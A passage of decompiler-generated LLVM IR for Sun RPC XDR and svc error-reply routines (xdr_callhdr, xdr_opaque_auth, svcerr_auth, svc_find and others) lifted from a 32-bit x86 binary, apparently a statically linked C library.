dec_label_pc_8062cf9:                             ; preds = %dec_label_pc_8062cd4, %dec_label_pc_8062ced
  %v0_8062cf9 = phi i32 [ %v2_8062cc8, %dec_label_pc_8062cd4 ], [ %v0_8062cf9.pre, %dec_label_pc_8062ced ]
  ret i32 %v0_8062cf9

; uselistorder directives
  uselistorder i32 %v2_8062cc8, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_8062cc8, { 1, 0, 2, 3 }
  uselistorder i32* %v1_8062caa, { 1, 0 }
  uselistorder i32 %v1_8062c2b, { 1, 0 }
  uselistorder i32 %tmp2, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp, { 8, 9, 10, 0, 1, 6, 5, 4, 3, 2, 7, 11 }
  uselistorder i32* %ecx.global-to-local, { 0, 3, 4, 1, 2, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 10, 8, 9, 11, 12, 13 }
  uselistorder label %dec_label_pc_8062cf9, { 1, 0 }
  uselistorder label %dec_label_pc_8062cc8, { 9, 6, 7, 8, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8062cb7, { 1, 0 }
}

define i32 @__GI_xdr_callhdr(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp1 = ptrtoint i32* %arg1 to i32
  %v0_8062cfa = load i32, i32* @esi, align 4
  %v0_8062cfb = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  store i32 %tmp1, i32* %esi.global-to-local, align 4
  %v1_8062d07 = add i32 %arg2, 4
  %v2_8062d07 = inttoptr i32 %v1_8062d07 to i32*
  store i32 0, i32* %v2_8062d07, align 4
  %v0_8062d0e = load i32, i32* %ebx.global-to-local, align 4
  %v1_8062d0e = add i32 %v0_8062d0e, 8
  %v2_8062d0e = inttoptr i32 %v1_8062d0e to i32*
  store i32 2, i32* %v2_8062d0e, align 4
  %v0_8062d15 = load i32, i32* %esi.global-to-local, align 4
  %v1_8062d15 = inttoptr i32 %v0_8062d15 to i32*
  %v2_8062d15 = load i32, i32* %v1_8062d15, align 4
  %v3_8062d15 = icmp eq i32 %v2_8062d15, 0
  %v1_8062d18 = icmp eq i1 %v3_8062d15, false
  br i1 %v1_8062d18, label %dec_label_pc_8062d76, label %dec_label_pc_8062d1a

dec_label_pc_8062d1a:                             ; preds = %entry
  %v0_8062d1c = load i32, i32* %ebx.global-to-local, align 4
  %v3_8062d1e = call i32 @xdr_u_long(i32* %v1_8062d15, i32 %v0_8062d1c)
  %v1_8062d26 = icmp eq i32 %v3_8062d1e, 0
  br i1 %v1_8062d26, label %dec_label_pc_8062d76, label %dec_label_pc_8062d2a

dec_label_pc_8062d2a:                             ; preds = %dec_label_pc_8062d1a
  %v0_8062d2c = load i32, i32* @ebx, align 4
  %v1_8062d2c = add i32 %v0_8062d2c, 4
  %v0_8062d30 = load i32, i32* %esi.global-to-local, align 4
  %v2_8062d31 = call i32 @xdr_enum(i32 %v0_8062d30, i32 %v1_8062d2c)
  %v1_8062d39 = icmp eq i32 %v2_8062d31, 0
  br i1 %v1_8062d39, label %dec_label_pc_8062d76, label %dec_label_pc_8062d3d

dec_label_pc_8062d3d:                             ; preds = %dec_label_pc_8062d2a
  %v0_8062d3f = load i32, i32* @ebx, align 4
  %v1_8062d3f = add i32 %v0_8062d3f, 8
  store i32 %v1_8062d3f, i32* @eax, align 4
  %v0_8062d43 = load i32, i32* %esi.global-to-local, align 4
  %v2_8062d44 = inttoptr i32 %v0_8062d43 to i32*
  %v3_8062d44 = call i32 @xdr_u_long(i32* %v2_8062d44, i32 %v1_8062d3f)
  %v1_8062d4c = icmp eq i32 %v3_8062d44, 0
  br i1 %v1_8062d4c, label %dec_label_pc_8062d76, label %dec_label_pc_8062d50

dec_label_pc_8062d50:                             ; preds = %dec_label_pc_8062d3d
  %v0_8062d52 = load i32, i32* @ebx, align 4
  %v1_8062d52 = add i32 %v0_8062d52, 12
  store i32 %v1_8062d52, i32* @eax, align 4
  %v0_8062d56 = load i32, i32* %esi.global-to-local, align 4
  %v2_8062d57 = inttoptr i32 %v0_8062d56 to i32*
  %v3_8062d57 = call i32 @xdr_u_long(i32* %v2_8062d57, i32 %v1_8062d52)
  %v1_8062d5f = icmp eq i32 %v3_8062d57, 0
  br i1 %v1_8062d5f, label %dec_label_pc_8062d76, label %dec_label_pc_8062d63

dec_label_pc_8062d63:                             ; preds = %dec_label_pc_8062d50
  %v0_8062d63 = load i32, i32* @ebx, align 4
  %v1_8062d63 = add i32 %v0_8062d63, 16
  store i32 %v1_8062d63, i32* @eax, align 4
  %v0_8062d66 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8062cfb, i32* %ebx.global-to-local, align 4
  store i32 %v0_8062cfa, i32* %esi.global-to-local, align 4
  %v2_8062d71 = inttoptr i32 %v0_8062d66 to i32*
  %v3_8062d71 = call i32 @xdr_u_long(i32* %v2_8062d71, i32 %v1_8062d63)
  br label %dec_label_pc_8062d76

dec_label_pc_8062d76:                             ; preds = %dec_label_pc_8062d50, %dec_label_pc_8062d3d, %dec_label_pc_8062d2a, %dec_label_pc_8062d1a, %entry, %dec_label_pc_8062d63
  store i32 %v0_8062cfb, i32* @ebx, align 4
  store i32 %v0_8062cfa, i32* @esi, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_8062cfb, { 1, 0 }
  uselistorder i32 %v0_8062cfa, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8062d76, { 5, 0, 1, 2, 3, 4 }
}

define i32 @__GI_xdr_rejected_reply(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  %stack_var_-8 = alloca i32, align 4
  %v0_8062d7c = load i32, i32* @esi, align 4
  %v0_8062d7d = load i32, i32* @ebx, align 4
  store i32 %v0_8062d7d, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  %v2_8062d8b = call i32 @xdr_enum(i32 %arg1, i32 %tmp3)
  %v1_8062d93 = icmp eq i32 %v2_8062d8b, 0
  br i1 %v1_8062d93, label %dec_label_pc_8062ddb, label %dec_label_pc_8062d97

dec_label_pc_8062d97:                             ; preds = %entry
  %v0_8062d97 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8062d97 = inttoptr i32 %v0_8062d97 to i32*
  %v2_8062d97 = load i32, i32* %v1_8062d97, align 4
  %v1_8062d99 = icmp eq i32 %v2_8062d97, 0
  br i1 %v1_8062d99, label %dec_label_pc_8062da2, label %dec_label_pc_8062d9d

dec_label_pc_8062d9d:                             ; preds = %dec_label_pc_8062d97
  %v8_8062d9d = icmp eq i32 %v2_8062d97, 1
  %v1_8062d9e = icmp eq i1 %v8_8062d9d, false
  br i1 %v1_8062d9e, label %dec_label_pc_8062ddb, label %dec_label_pc_8062d9d.dec_label_pc_8062dc8_crit_edge

dec_label_pc_8062d9d.dec_label_pc_8062dc8_crit_edge: ; preds = %dec_label_pc_8062d9d
  br label %dec_label_pc_8062dc8

dec_label_pc_8062da2:                             ; preds = %dec_label_pc_8062d97
  %v1_8062da4 = add i32 %v0_8062d97, 4
  store i32 %v1_8062da4, i32* @eax, align 4
  %v0_8062da8 = load i32, i32* %esi.global-to-local, align 4
  %v2_8062da9 = inttoptr i32 %v0_8062da8 to i32*
  %v3_8062da9 = call i32 @xdr_u_long(i32* %v2_8062da9, i32 %v1_8062da4)
  %v1_8062db1 = icmp eq i32 %v3_8062da9, 0
  br i1 %v1_8062db1, label %dec_label_pc_8062ddb, label %dec_label_pc_8062db5

dec_label_pc_8062db5:                             ; preds = %dec_label_pc_8062da2
  %v0_8062db5 = load i32, i32* @ebx, align 4
  %v1_8062db5 = add i32 %v0_8062db5, 8
  store i32 %v1_8062db5, i32* @eax, align 4
  %v0_8062db8 = load i32, i32* %esi.global-to-local, align 4
  %v2_8062dc1 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8062dc1, i32* %ebx.global-to-local, align 4
  store i32 %v0_8062d7c, i32* %esi.global-to-local, align 4
  %v2_8062dc3 = inttoptr i32 %v0_8062db8 to i32*
  %v3_8062dc3 = call i32 @xdr_u_long(i32* %v2_8062dc3, i32 %v1_8062db5)
  %v0_8062dc8.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8062dc8

dec_label_pc_8062dc8:                             ; preds = %dec_label_pc_8062d9d.dec_label_pc_8062dc8_crit_edge, %dec_label_pc_8062db5
  %v0_8062dc8 = phi i32 [ %v0_8062d97, %dec_label_pc_8062d9d.dec_label_pc_8062dc8_crit_edge ], [ %v0_8062dc8.pre, %dec_label_pc_8062db5 ]
  %v1_8062dc8 = add i32 %v0_8062dc8, 4
  %v0_8062dcb = load i32, i32* %esi.global-to-local, align 4
  %v2_8062dd4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8062dd4, i32* %ebx.global-to-local, align 4
  store i32 %v0_8062d7c, i32* %esi.global-to-local, align 4
  %v2_8062dd6 = call i32 @xdr_enum(i32 %v0_8062dcb, i32 %v1_8062dc8)
  br label %dec_label_pc_8062ddb

dec_label_pc_8062ddb:                             ; preds = %dec_label_pc_8062da2, %dec_label_pc_8062d9d, %entry, %dec_label_pc_8062dc8
  %v2_8062dde = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8062dde, i32* %ebx.global-to-local, align 4
  store i32 %v0_8062d7c, i32* %esi.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_8062d7c, { 2, 1, 0 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 3, 2, 4, 5, 6 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8062ddb, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8062dc8, { 1, 0 }
}

define i32 @__GI_xdr_replymsg() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v0_8062de1 = load i32, i32* @esi, align 4
  store i32 %tmp2, i32* @esi, align 4
  %v2_8062df0 = inttoptr i32 %tmp2 to i32*
  %v3_8062df0 = call i32 @xdr_u_long(i32* %v2_8062df0, i32 %tmp)
  %v1_8062df8 = icmp eq i32 %v3_8062df0, 0
  br i1 %v1_8062df8, label %dec_label_pc_8062e32, label %dec_label_pc_8062dfc

dec_label_pc_8062dfc:                             ; preds = %entry
  %v0_8062dfc = load i32, i32* @ebx, align 4
  %v1_8062dfc = add i32 %v0_8062dfc, 4
  %v0_8062e02 = load i32, i32* @esi, align 4
  %v2_8062e03 = call i32 @xdr_enum(i32 %v0_8062e02, i32 %v1_8062dfc)
  %v1_8062e0b = icmp eq i32 %v2_8062e03, 0
  br i1 %v1_8062e0b, label %dec_label_pc_8062e32, label %dec_label_pc_8062e0f

dec_label_pc_8062e0f:                             ; preds = %dec_label_pc_8062dfc
  %v0_8062e0f = load i32, i32* @ebx, align 4
  %v1_8062e0f = add i32 %v0_8062e0f, 4
  %v2_8062e0f = inttoptr i32 %v1_8062e0f to i32*
  %v3_8062e0f = load i32, i32* %v2_8062e0f, align 4
  %v12_8062e0f = icmp eq i32 %v3_8062e0f, 1
  %v1_8062e13 = icmp eq i1 %v12_8062e0f, false
  br i1 %v1_8062e13, label %dec_label_pc_8062e32, label %dec_label_pc_8062e15

dec_label_pc_8062e15:                             ; preds = %dec_label_pc_8062e0f
  %v1_8062e18 = add i32 %v0_8062e0f, 12
  %v1_8062e23 = add i32 %v0_8062e0f, 8
  %v0_8062e27 = load i32, i32* @esi, align 4
  %v5_8062e28 = inttoptr i32 %v1_8062e23 to i32*
  %v6_8062e28 = call i32 @xdr_union(i32 %v0_8062e27, i32* %v5_8062e28, i32 %v1_8062e18, i32 ptrtoint (i32* @global_var_806e1e0.804 to i32), i32 0)
  br label %dec_label_pc_8062e34

dec_label_pc_8062e32:                             ; preds = %dec_label_pc_8062e0f, %dec_label_pc_8062dfc, %entry
  br label %dec_label_pc_8062e34

dec_label_pc_8062e34:                             ; preds = %dec_label_pc_8062e15, %dec_label_pc_8062e32
  %v0_8062e37 = phi i32 [ %v6_8062e28, %dec_label_pc_8062e15 ], [ 0, %dec_label_pc_8062e32 ]
  store i32 %v0_8062de1, i32* @esi, align 4
  ret i32 %v0_8062e37

; uselistorder directives
  uselistorder i32 %tmp2, { 1, 0 }
  uselistorder label %dec_label_pc_8062e34, { 1, 0 }
}

define i32 @xdr_des_block(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8062e45 = call i32 @xdr_opaque(i32 %arg1, i32 %arg2, i32 8)
  ret i32 %v3_8062e45
}

define i32 @xdr_opaque_auth(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8062e4e = load i32, i32* @esi, align 4
  %v0_8062e4f = load i32, i32* @ebx, align 4
  store i32 %v0_8062e4f, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v2_8062e5d = call i32 @xdr_enum(i32 %arg1, i32 %arg2)
  %v1_8062e67 = icmp eq i32 %v2_8062e5d, 0
  br i1 %v1_8062e67, label %dec_label_pc_8062e83, label %dec_label_pc_8062e6b

dec_label_pc_8062e6b:                             ; preds = %entry
  %v0_8062e6b = load i32, i32* @ebx, align 4
  %v1_8062e6b = add i32 %v0_8062e6b, 8
  %v1_8062e74 = add i32 %v0_8062e6b, 4
  %v0_8062e78 = load i32, i32* @esi, align 4
  %v4_8062e79 = inttoptr i32 %v0_8062e78 to i32*
  %v5_8062e79 = call i32 @xdr_bytes(i32* %v4_8062e79, i32 %v1_8062e74, i32 %v1_8062e6b, i32 400)
  br label %dec_label_pc_8062e83

dec_label_pc_8062e83:                             ; preds = %entry, %dec_label_pc_8062e6b
  %v0_8062e83 = phi i32 [ 0, %entry ], [ %v5_8062e79, %dec_label_pc_8062e6b ]
  %v2_8062e86 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8062e86, i32* @ebx, align 4
  store i32 %v0_8062e4e, i32* @esi, align 4
  ret i32 %v0_8062e83

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8062e83, { 1, 0 }
}

define i32 @__GI_xdr_accepted_reply(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8062e89 = load i32, i32* @esi, align 4
  %v0_8062e8a = load i32, i32* @ebx, align 4
  store i32 %v0_8062e8a, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v2_8062e98 = call i32 @xdr_opaque_auth(i32 %arg1, i32 %arg2)
  %v1_8062ea0 = icmp eq i32 %v2_8062e98, 0
  br i1 %v1_8062ea0, label %dec_label_pc_8062f03, label %dec_label_pc_8062ea4

dec_label_pc_8062ea4:                             ; preds = %entry
  %v0_8062ea6 = load i32, i32* @ebx, align 4
  %v1_8062ea6 = add i32 %v0_8062ea6, 12
  %v0_8062eaa = load i32, i32* @esi, align 4
  %v2_8062eab = call i32 @xdr_enum(i32 %v0_8062eaa, i32 %v1_8062ea6)
  %v1_8062eb3 = icmp eq i32 %v2_8062eab, 0
  br i1 %v1_8062eb3, label %dec_label_pc_8062f03, label %dec_label_pc_8062eb7

dec_label_pc_8062eb7:                             ; preds = %dec_label_pc_8062ea4
  %v0_8062eb7 = load i32, i32* @ebx, align 4
  %v1_8062eb7 = add i32 %v0_8062eb7, 12
  %v2_8062eb7 = inttoptr i32 %v1_8062eb7 to i32*
  %v3_8062eb7 = load i32, i32* %v2_8062eb7, align 4
  %v1_8062eba = icmp eq i32 %v3_8062eb7, 0
  br i1 %v1_8062eba, label %dec_label_pc_8062eca, label %dec_label_pc_8062ebe

dec_label_pc_8062ebe:                             ; preds = %dec_label_pc_8062eb7
  %v9_8062ec3 = icmp eq i32 %v3_8062eb7, 2
  %v1_8062ec6 = icmp eq i1 %v9_8062ec3, false
  br i1 %v1_8062ec6, label %dec_label_pc_8062f05, label %dec_label_pc_8062edd

dec_label_pc_8062eca:                             ; preds = %dec_label_pc_8062eb7
  %v1_8062ed5 = add i32 %v0_8062eb7, 20
  %v2_8062ed5 = inttoptr i32 %v1_8062ed5 to i32*
  %v3_8062ed5 = load i32, i32* %v2_8062ed5, align 4
  %v2_8062ed9 = load i32, i32* %stack_var_-8, align 4
  store i32 %v0_8062e89, i32* @esi, align 4
  call void @__pseudo_branch(i32 %v3_8062ed5)
  br label %dec_label_pc_8062edd

dec_label_pc_8062edd:                             ; preds = %dec_label_pc_8062ebe, %dec_label_pc_8062eca
  %v0_8062edf = phi i32 [ %v0_8062eb7, %dec_label_pc_8062ebe ], [ %v2_8062ed9, %dec_label_pc_8062eca ]
  %v1_8062edf = add i32 %v0_8062edf, 16
  store i32 %v1_8062edf, i32* @eax, align 4
  %v0_8062ee3 = load i32, i32* @esi, align 4
  %v2_8062ee4 = inttoptr i32 %v0_8062ee3 to i32*
  %v3_8062ee4 = call i32 @xdr_u_long(i32* %v2_8062ee4, i32 %v1_8062edf)
  %v1_8062eec = icmp eq i32 %v3_8062ee4, 0
  br i1 %v1_8062eec, label %dec_label_pc_8062f03, label %dec_label_pc_8062ef0

dec_label_pc_8062ef0:                             ; preds = %dec_label_pc_8062edd
  %v0_8062ef0 = load i32, i32* @ebx, align 4
  %v1_8062ef0 = add i32 %v0_8062ef0, 20
  %v0_8062ef3 = load i32, i32* @esi, align 4
  %v2_8062efb = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8062efb, i32* @eax, align 4
  %v2_8062efe = inttoptr i32 %v0_8062ef3 to i32*
  %v3_8062efe = call i32 @xdr_u_long(i32* %v2_8062efe, i32 %v1_8062ef0)
  br label %dec_label_pc_8062f03

dec_label_pc_8062f03:                             ; preds = %dec_label_pc_8062edd, %dec_label_pc_8062ea4, %entry, %dec_label_pc_8062ef0
  br label %dec_label_pc_8062f05

dec_label_pc_8062f05:                             ; preds = %dec_label_pc_8062ebe, %dec_label_pc_8062f03
  %v0_8062f08 = phi i32 [ 1, %dec_label_pc_8062ebe ], [ 0, %dec_label_pc_8062f03 ]
  ret i32 %v0_8062f08

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8062f05, { 1, 0 }
  uselistorder label %dec_label_pc_8062f03, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8062edd, { 1, 0 }
}

define i32 @svc_sendreply(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_8062f28 = add i32 %arg1, 32
  %v3_8062f30 = bitcast i32* %stack_var_-40 to i16*
  %v4_8062f30 = call i32 @memcpy(i16* %v3_8062f30, i32 %v1_8062f28, i32 12)
  %v1_8062f4f = add i32 %arg1, 8
  %v2_8062f4f = inttoptr i32 %v1_8062f4f to i32*
  %v3_8062f4f = load i32, i32* %v2_8062f4f, align 4
  %v2_8062f52 = ptrtoint i32* %stack_var_-52 to i32
  %v5_8062f58 = add i32 %v3_8062f4f, 12
  %v6_8062f58 = inttoptr i32 %v5_8062f58 to i32*
  %v7_8062f58 = load i32, i32* %v6_8062f58, align 4
  call void @__pseudo_call(i32 %v7_8062f58)
  ret i32 %v2_8062f52
}

define i32 @svcerr_noproc(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_8062f7c = add i32 %arg1, 32
  %v3_8062f84 = bitcast i32* %stack_var_-40 to i16*
  %v4_8062f84 = call i32 @memcpy(i16* %v3_8062f84, i32 %v1_8062f7c, i32 12)
  %v1_8062f93 = add i32 %arg1, 8
  %v2_8062f93 = inttoptr i32 %v1_8062f93 to i32*
  %v3_8062f93 = load i32, i32* %v2_8062f93, align 4
  %v2_8062f96 = ptrtoint i32* %stack_var_-52 to i32
  %v5_8062f9c = add i32 %v3_8062f93, 12
  %v6_8062f9c = inttoptr i32 %v5_8062f9c to i32*
  %v7_8062f9c = load i32, i32* %v6_8062f9c, align 4
  call void @__pseudo_call(i32 %v7_8062f9c)
  ret i32 %v2_8062f96
}

define i32 @svcerr_decode(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_8062fc0 = add i32 %arg1, 32
  %v3_8062fc8 = bitcast i32* %stack_var_-40 to i16*
  %v4_8062fc8 = call i32 @memcpy(i16* %v3_8062fc8, i32 %v1_8062fc0, i32 12)
  %v1_8062fd7 = add i32 %arg1, 8
  %v2_8062fd7 = inttoptr i32 %v1_8062fd7 to i32*
  %v3_8062fd7 = load i32, i32* %v2_8062fd7, align 4
  %v2_8062fda = ptrtoint i32* %stack_var_-52 to i32
  %v5_8062fe0 = add i32 %v3_8062fd7, 12
  %v6_8062fe0 = inttoptr i32 %v5_8062fe0 to i32*
  %v7_8062fe0 = load i32, i32* %v6_8062fe0, align 4
  call void @__pseudo_call(i32 %v7_8062fe0)
  ret i32 %v2_8062fda
}

define i32 @svcerr_systemerr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_8063004 = add i32 %arg1, 32
  %v3_806300c = bitcast i32* %stack_var_-40 to i16*
  %v4_806300c = call i32 @memcpy(i16* %v3_806300c, i32 %v1_8063004, i32 12)
  %v1_806301b = add i32 %arg1, 8
  %v2_806301b = inttoptr i32 %v1_806301b to i32*
  %v3_806301b = load i32, i32* %v2_806301b, align 4
  %v2_806301e = ptrtoint i32* %stack_var_-52 to i32
  %v5_8063024 = add i32 %v3_806301b, 12
  %v6_8063024 = inttoptr i32 %v5_8063024 to i32*
  %v7_8063024 = load i32, i32* %v6_8063024, align 4
  call void @__pseudo_call(i32 %v7_8063024)
  ret i32 %v2_806301e
}

define i32 @svcerr_auth(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_8063053 = add i32 %arg1, 8
  %v2_8063053 = inttoptr i32 %v1_8063053 to i32*
  %v3_8063053 = load i32, i32* %v2_8063053, align 4
  store i32 %v3_8063053, i32* @edx, align 4
  %v2_8063056 = ptrtoint i32* %stack_var_-48 to i32
  %v5_806305c = add i32 %v3_8063053, 12
  %v6_806305c = inttoptr i32 %v5_806305c to i32*
  %v7_806305c = load i32, i32* %v6_806305c, align 4
  call void @__pseudo_call(i32 %v7_806305c)
  ret i32 %v2_8063056

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @svcerr_weakauth(i32 %arg1) local_unnamed_addr {
entry:
  %v2_806306c = call i32 @svcerr_auth(i32 %arg1, i32 5)
  ret i32 %v2_806306c
}

define i32 @__GI_svcerr_noprog() local_unnamed_addr {
entry:
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_8063091 = add i32 %tmp3, 32
  %v3_8063099 = bitcast i32* %stack_var_-40 to i16*
  %v4_8063099 = call i32 @memcpy(i16* %v3_8063099, i32 %v1_8063091, i32 12)
  %v1_80630a8 = add i32 %tmp3, 8
  %v2_80630a8 = inttoptr i32 %v1_80630a8 to i32*
  %v3_80630a8 = load i32, i32* %v2_80630a8, align 4
  store i32 %v3_80630a8, i32* @edx, align 4
  %v2_80630ab = ptrtoint i32* %stack_var_-52 to i32
  %v5_80630b1 = add i32 %v3_80630a8, 12
  %v6_80630b1 = inttoptr i32 %v5_80630b1 to i32*
  %v7_80630b1 = load i32, i32* %v6_80630b1, align 4
  call void @__pseudo_call(i32 %v7_80630b1)
  ret i32 %v2_80630ab
}

define i32 @svcerr_progvers() local_unnamed_addr {
entry:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_80630d5 = add i32 %tmp7, 32
  %v3_80630dd = bitcast i32* %stack_var_-40 to i16*
  %v4_80630dd = call i32 @memcpy(i16* %v3_80630dd, i32 %v1_80630d5, i32 12)
  %v1_80630fc = add i32 %tmp7, 8
  %v2_80630fc = inttoptr i32 %v1_80630fc to i32*
  %v3_80630fc = load i32, i32* %v2_80630fc, align 4
  store i32 %v3_80630fc, i32* @edx, align 4
  %v2_80630ff = ptrtoint i32* %stack_var_-52 to i32
  %v5_8063105 = add i32 %v3_80630fc, 12
  %v6_8063105 = inttoptr i32 %v5_8063105 to i32*
  %v7_8063105 = load i32, i32* %v6_8063105, align 4
  call void @__pseudo_call(i32 %v7_8063105)
  ret i32 %v2_80630ff
}

define i32 @svc_find(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_806310d = load i32, i32* @edi, align 4
  %v0_806310e = load i32, i32* @eax, align 4
  store i32 %v0_806310e, i32* @edi, align 4
  %v0_8063110 = load i32, i32* @esi, align 4
  %v0_8063111 = load i32, i32* @ecx, align 4
  store i32 %v0_8063111, i32* @esi, align 4
  %v0_8063113 = load i32, i32* @ebx, align 4
  store i32 %v0_8063113, i32* %stack_var_-12, align 4
  %v0_8063114 = load i32, i32* @edx, align 4
  store i32 %v0_8063114, i32* @ebx, align 4
  %v1_8063116 = call i32 @__rpc_thread_variables(i32 %v0_8063113)
  store i32 %v1_8063116, i32* %eax.global-to-local, align 4
  %v1_806311d = add i32 %v1_8063116, 184
  %storemerge.in1 = inttoptr i32 %v1_806311d to i32*
  %storemerge2 = load i32, i32* %storemerge.in1, align 4
  store i32 %storemerge2, i32* %eax.global-to-local, align 4
  %v1_80631333 = icmp eq i32 %storemerge2, 0
  %v1_806313510 = icmp eq i1 %v1_80631333, false
  br i1 %v1_806313510, label %dec_label_pc_8063125.lr.ph, label %dec_label_pc_8063137

dec_label_pc_8063125.lr.ph:                       ; preds = %entry
  %v4_8063125.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8063125

dec_label_pc_8063125:                             ; preds = %dec_label_pc_8063125.lr.ph, %dec_label_pc_806312f
  %v0_806313714 = phi i32 [ 0, %dec_label_pc_8063125.lr.ph ], [ %v0_806312f, %dec_label_pc_806312f ]
  %v0_806312f = phi i32 [ %storemerge2, %dec_label_pc_8063125.lr.ph ], [ %storemerge, %dec_label_pc_806312f ]
  %v1_8063125 = add i32 %v0_806312f, 4
  %v2_8063125 = inttoptr i32 %v1_8063125 to i32*
  %v3_8063125 = load i32, i32* %v2_8063125, align 4
  %v15_8063125 = icmp eq i32 %v3_8063125, %v4_8063125.pre
  %v1_8063128 = icmp eq i1 %v15_8063125, false
  br i1 %v1_8063128, label %dec_label_pc_806312f, label %dec_label_pc_806312a

dec_label_pc_806312a:                             ; preds = %dec_label_pc_8063125
  %v1_806312a = add i32 %v0_806312f, 8
  %v2_806312a = inttoptr i32 %v1_806312a to i32*
  %v3_806312a = load i32, i32* %v2_806312a, align 4
  %v4_806312a = load i32, i32* @ebx, align 4
  %v15_806312a = icmp eq i32 %v3_806312a, %v4_806312a
  br i1 %v15_806312a, label %dec_label_pc_806312a.dec_label_pc_8063137_crit_edge, label %dec_label_pc_806312f

dec_label_pc_806312f:                             ; preds = %dec_label_pc_806312a, %dec_label_pc_8063125
  %storemerge.in = inttoptr i32 %v0_806312f to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8063133 = icmp eq i32 %storemerge, 0
  %v1_8063135 = icmp eq i1 %v1_8063133, false
  br i1 %v1_8063135, label %dec_label_pc_8063125, label %dec_label_pc_8063133.dec_label_pc_8063137_crit_edge

dec_label_pc_806312a.dec_label_pc_8063137_crit_edge: ; preds = %dec_label_pc_806312a
  br label %dec_label_pc_8063137

dec_label_pc_8063133.dec_label_pc_8063137_crit_edge: ; preds = %dec_label_pc_806312f
  br label %dec_label_pc_8063137

dec_label_pc_8063137:                             ; preds = %dec_label_pc_8063133.dec_label_pc_8063137_crit_edge, %dec_label_pc_806312a.dec_label_pc_8063137_crit_edge, %entry
  %v0_8063137 = phi i32 [ %v0_806312f, %dec_label_pc_8063133.dec_label_pc_8063137_crit_edge ], [ %v0_806313714, %dec_label_pc_806312a.dec_label_pc_8063137_crit_edge ], [ 0, %entry ]
  %v1_8063137 = load i32, i32* @esi, align 4
  %v2_8063137 = inttoptr i32 %v1_8063137 to i32*
  store i32 %v0_8063137, i32* %v2_8063137, align 4
  %v2_8063139 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8063139, i32* @ebx, align 4
  store i32 %v0_8063110, i32* @esi, align 4
  store i32 %v0_806310d, i32* @edi, align 4
  %v0_806313c = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_806313c

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_806312f, { 0, 2, 3, 4, 1 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8063125, { 1, 0 }
}

